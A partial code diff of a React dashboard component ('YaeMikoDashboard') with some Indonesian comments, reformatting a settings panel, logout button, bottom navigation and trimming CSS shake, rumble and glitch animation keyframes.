-              {/* PAIRING PRIBADI INPUT (Hanya muncul jika mode Pribadi) */}
               {senderType === "pribadi" && (
                 <div className="bg-white/5 border border-white/10 rounded-2xl p-4 mt-2 animate-in fade-in slide-in-from-top-2">
                   <div className="space-y-3">
@@ -637,13 +472,10 @@ export default function YaeMikoDashboard() {
                   </div>
                 </div>
               )}
-
             </div>
           ) : (
             <div className="animate-in fade-in duration-500">
-              <h2 className="text-lg font-black italic uppercase mb-10 border-b border-white/10 pb-4 text-cyan-400">
-                Setting {userRole === "admin" ? "Leo (Owner)" : "Selz"}
-              </h2>
+              <h2 className="text-lg font-black italic uppercase mb-10 border-b border-white/10 pb-4 text-cyan-400">Setting {userRole === "admin" ? "Leo (Owner)" : "Selz"}</h2>
               <div className="space-y-5">
                 <div className="bg-white/5 p-6 rounded-[2.5rem] border-white/5 backdrop-blur-lg shadow-xl">
                   <div className="flex items-center gap-3 mb-5 text-xs font-black uppercase text-white/60 italic"><Zap size={16} className="text-cyan-400"/> Engine Speed</div>
@@ -659,16 +491,13 @@ export default function YaeMikoDashboard() {
                 </div>
                 <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem] border-white/5">
                   <div className="flex items-center gap-4"><Music className="text-cyan-400" size={22} /><span className="text-xs font-black uppercase italic">Audio Output</span></div>
-                  <button onClick={() => setIsMusicOn(!isMusicOn)} className={`p-3 rounded-2xl transition-all ${isMusicOn ? 'bg-cyan-500 text-black' : 'bg-black/40 text-white/40'}`}>
-                    {isMusicOn ? <Volume2 size={20}/> : <VolumeX size={20}/>}
-                  </button>
+                  <button onClick={() => setIsMusicOn(!isMusicOn)} className={`p-3 rounded-2xl transition-all ${isMusicOn ? 'bg-cyan-500 text-black' : 'bg-black/40 text-white/40'}`}>{isMusicOn ? <Volume2 size={20}/> : <VolumeX size={20}/>}</button>
                 </div>
                 <button onClick={() => { setIsLoggedIn(false); setUsername(""); setPassword(""); }} className="w-full flex items-center justify-center gap-4 py-6 bg-red-600/10 border-red-600/20 rounded-[2.5rem] text-xs font-black uppercase italic text-red-500 hover:bg-red-600 hover:text-white transition-all">LOG OUT</button>
               </div>
             </div>
           )}
 
-          {/* BOTTOM NAVIGATION */}
           <div className="fixed bottom-8 left-16 right-16 bg-[#0a1628]/95 border border-white/10 p-4 rounded-[2.5rem] flex justify-around backdrop-blur-3xl z-20 shadow-2xl">
             <button onClick={() => setCurrentView('dashboard')} className={`p-1 transition-all ${currentView === 'dashboard' ? 'text-cyan-400 scale-110 drop-shadow-[0_0_8px_rgba(0,229,255,0.5)]' : 'text-white/20 hover:text-white/40'}`}><LayoutDashboard size={22}/></button>
             <button onClick={() => setCurrentView('settings')} className={`p-1 transition-all ${currentView === 'settings' ? 'text-cyan-400 scale-110 drop-shadow-[0_0_8px_rgba(0,229,255,0.5)]' : 'text-white/20 hover:text-white/40'}`}><Settings size={22}/></button>
@@ -676,35 +505,20 @@ export default function YaeMikoDashboard() {
         </div>
       )}
 
-      {/* KEYFRAMES ANIMASI */}
       <style jsx global>{`
       @keyframes shake {
         0% { transform: translate(2px, 2px) rotate(0deg); }
         10% { transform: translate(-1px, -2px) rotate(-1deg); }
-        20% { transform: translate(-3px, 0px) rotate(1deg); }
-        30% { transform: translate(3px, 2px) rotate(0deg); }
-        40% { transform: translate(1px, -1px) rotate(1deg); }
-        50% { transform: translate(-1px, 2px) rotate(-1deg); }
-        60% { transform: translate(-3px, 1px) rotate(0deg); }
-        70% { transform: translate(3px, 1px) rotate(-1deg); }
-        80% { transform: translate(-1px, -1px) rotate(1deg); }
-        90% { transform: translate(1px, 2px) rotate(0deg); }
         100% { transform: translate(1px, -2px) rotate(-1deg); }
       }
       .animate-shake_violent { animation: shake 0.3s infinite; }
-
       @keyframes rumble {
         0%, 100% { background-color: rgba(69, 10, 10, 0.9); }
         50% { background-color: rgba(127, 29, 29, 0.95); }
       }
       .animate-bg_rumble { animation: rumble 0.15s infinite; }
-
       @keyframes glitch {
         0% { text-shadow: 3px 0 red, -3px 0 cyan; transform: skewX(0deg); }
-        20% { text-shadow: -3px 0 red, 3px 0 cyan; transform: skewX(2deg); }
-        40% { text-shadow: 3px 3px red, -3px -3px cyan; transform: skewX(-2deg); }
-        60% { text-shadow: -3px -3px red, 3px 3px cyan; transform: skewX(1deg); }
-        80% { text-shadow: 3px -3px red, -3px 3px cyan; transform: skewX(-1deg); }
         100% { text-shadow: 3px 0 red, -3px 0 cyan; transform: skewX(0deg); }
       }
       .animate-glitch_extreme { animation: glitch 0.2s infinite; }
